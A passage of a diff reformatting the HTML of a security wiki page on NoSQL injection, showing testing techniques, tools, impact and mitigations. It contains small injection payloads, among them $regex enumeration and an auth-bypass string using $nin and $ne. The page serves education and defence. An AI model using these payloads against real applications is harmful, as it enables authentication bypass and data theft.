 <li><strong>Regex brute-force</strong> — Test <code>{&quot;field&quot;: {&quot;$regex&quot;: &quot;^a&quot;}}</code>, <code>{&quot;field&quot;: {&quot;$regex&quot;: &quot;^b&quot;}}</code> etc. to enumerate field values one character at a time.</li>
 </ol>
-<h3 id="b-automated-tools">
-  B. Automated Tools
-  <a class="anchor" href="#b-automated-tools">#</a>
-</h3>
+<h3 id="b-automated-tools">B. Automated Tools<a class="anchor" href="#b-automated-tools">#</a></h3>
 <table>
-<thead>
-<tr>
-<th>Tool</th>
-<th>Usage</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>NoSQLMap</strong></td>
-<td>Automated detection and exploitation of NoSQLi across MongoDB, CouchDB</td>
-</tr>
-<tr>
-<td><strong>Burp Suite</strong> (Intruder, Turbo Intruder)</td>
-<td>Fuzz operator payloads, brute-force regex enumeration</td>
-</tr>
-<tr>
-<td><strong>OWASP ZAP</strong></td>
-<td>Active scanning with NoSQLi passive and active rules</td>
-</tr>
-<tr>
-<td><strong>Nuclei</strong></td>
-<td>Templates for known NoSQLi CVEs and common patterns</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Tool</th>
+					<th>Usage</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><strong>NoSQLMap</strong></td>
+					<td>Automated detection and exploitation of NoSQLi across MongoDB, CouchDB</td>
+			</tr>
+			<tr>
+					<td><strong>Burp Suite</strong> (Intruder, Turbo Intruder)</td>
+					<td>Fuzz operator payloads, brute-force regex enumeration</td>
+			</tr>
+			<tr>
+					<td><strong>OWASP ZAP</strong></td>
+					<td>Active scanning with NoSQLi passive and active rules</td>
+			</tr>
+			<tr>
+					<td><strong>Nuclei</strong></td>
+					<td>Templates for known NoSQLi CVEs and common patterns</td>
+			</tr>
+	</tbody>
 </table>
 <hr>
-<h2 id="impact">
-  Impact
-  <a class="anchor" href="#impact">#</a>
-</h2>
+<h2 id="impact">Impact<a class="anchor" href="#impact">#</a></h2>
 <ul>
 <li><strong>Authentication Bypass</strong> — Log in without valid credentials using <code>$ne</code>, <code>$gt</code>, <code>$regex</code>.</li>
 <li><strong>Data Exfiltration</strong> — Dump all records or enumerate field values character by character via regex.</li>
@@ -1789,53 +1683,47 @@ login[$nin][]=admin&amp;login[$nin][]=test&amp;pass[$ne]=toto
 <li><strong>Schema Tampering</strong> — Delete or modify fields (<code>$unset</code>, <code>$set</code>) to remove 2FA, alter roles.</li>
 <li><strong>Information Disclosure</strong> — Reveal hidden fields, schema structure, or database metadata.</li>
 </ul>
-<h2 id="prevention--mitigation">
-  Prevention &amp; Mitigation
-  <a class="anchor" href="#prevention--mitigation">#</a>
-</h2>
+<h2 id="prevention--mitigation">Prevention &amp; Mitigation<a class="anchor" href="#prevention--mitigation">#</a></h2>
 <table>
-<thead>
-<tr>
-<th>Technique</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Input Validation</td>
-<td>Block <code>$</code>, <code>{}</code>, <code>[</code>, <code>;</code>, and operators in input</td>
-</tr>
-<tr>
-<td><strong>Parameterization</strong></td>
-<td>Use driver-native query building (e.g. <code>find({})</code>)</td>
-</tr>
-<tr>
-<td><strong>Disable JS in DB</strong></td>
-<td>MongoDB: <code>--noscripting</code> or restrict <code>$where</code> operator</td>
-</tr>
-<tr>
-<td><strong>Access Control</strong></td>
-<td>Use DB roles with principle of least privilege</td>
-</tr>
-<tr>
-<td><strong>Web Application Firewall (WAF)</strong></td>
-<td>Block typical operator strings in input</td>
-</tr>
-<tr>
-<td><strong>Logging &amp; Monitoring</strong></td>
-<td>Alert on operator patterns or repeated regex use</td>
-</tr>
-<tr>
-<td><strong>Sanitization Libraries</strong></td>
-<td>Use libraries like <code>mongo-sanitize</code> (Node.js)</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Technique</th>
+					<th>Description</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Input Validation</td>
+					<td>Block <code>$</code>, <code>{}</code>, <code>[</code>, <code>;</code>, and operators in input</td>
+			</tr>
+			<tr>
+					<td><strong>Parameterization</strong></td>
+					<td>Use driver-native query building (e.g. <code>find({})</code>)</td>
+			</tr>
+			<tr>
+					<td><strong>Disable JS in DB</strong></td>
+					<td>MongoDB: <code>--noscripting</code> or restrict <code>$where</code> operator</td>
+			</tr>
+			<tr>
+					<td><strong>Access Control</strong></td>
+					<td>Use DB roles with principle of least privilege</td>
+			</tr>
+			<tr>
+					<td><strong>Web Application Firewall (WAF)</strong></td>
+					<td>Block typical operator strings in input</td>
+			</tr>
+			<tr>
+					<td><strong>Logging &amp; Monitoring</strong></td>
+					<td>Alert on operator patterns or repeated regex use</td>
+			</tr>
+			<tr>
+					<td><strong>Sanitization Libraries</strong></td>
+					<td>Use libraries like <code>mongo-sanitize</code> (Node.js)</td>
+			</tr>
+	</tbody>
 </table>
 <hr>
-<h2 id="good-to-read">
-  Good To Read
-  <a class="anchor" href="#good-to-read">#</a>
-</h2>
+<h2 id="good-to-read">Good To Read<a class="anchor" href="#good-to-read">#</a></h2>
 <ul>
 <li><strong>HackerOne Hacktivity</strong> —
 <ul>
@@ -1847,10 +1735,7 @@ login[$nin][]=admin&amp;login[$nin][]=test&amp;pass[$ne]=toto
 <li><strong>PortSwigger Web Security Academy</strong> — NoSQL injection lab track.</li>
 <li><strong>Bugcrowd VRT</strong> — Injection &gt; NoSQL Injection for severity context.</li>
 </ul>
-<h2 id="references">
-  References
-  <a class="anchor" href="#references">#</a>
-</h2>
+<h2 id="references">References<a class="anchor" href="#references">#</a></h2>
 <p><a href="https://portswigger.net/web-security/nosql-injection" target="_blank" rel="noreferrer noopener nofollow">https://portswigger.net/web-security/nosql-injection</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection" target="_blank" rel="noreferrer noopener nofollow">https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><a href="https://www.vaadata.com/blog/what-is-nosql-injection-exploitations-and-security-best-practices/" target="_blank" rel="noreferrer noopener nofollow">https://www.vaadata.com/blog/what-is-nosql-injection-exploitations-and-security-best-practices/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
@@ -1866,49 +1751,62 @@ login[$nin][]=admin&amp;login[$nin][]=test&amp;pass[$ne]=toto
         
   <div class="flex flex-wrap justify-between">
 
-
-  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
-      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>August 5, 2026</span>
-    </a>
-  </div>
-
-
-
-  <div>
-    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/NoSQL%20Injection.md" target="_blank" rel="noopener">
-      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
-      <span>Edit this page</span>
-    </a>
-  </div>
-
+<div>
 
 </div>
 
+<div>
 
+</div>
 
-  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+</div>
 
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/application-security/web/MFA-Bypass/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Multi-Factor Authentication (MFA) Bypass</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/application-security/web/OAuth-Cheatsheet/" class="flex align-center">
+        <span>OAuth (Open Authorization)</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
 
  
         
-      </footer>
-
-      
   
   <div class="book-comments">
 
 </div>
   
  
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
 
       <label for="menu-control" class="hidden book-menu-overlay"></label>
     </div>
 
     
-    <aside class="book-toc">
-      <div class="book-toc-content">
-        
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
   
 <nav id="TableOfContents">
   <ul>
@@ -1966,15 +1864,24 @@ login[$nin][]=admin&amp;login[$nin][]=test&amp;pass[$ne]=toto
 </nav>
 
 
+
+    </div>
+  </aside>
+  
  
-      </div>
-    </aside>
-    
   </main>
 
   
 </body>
 </html>
+
+
+
+
+
+
+
+
 
 
 
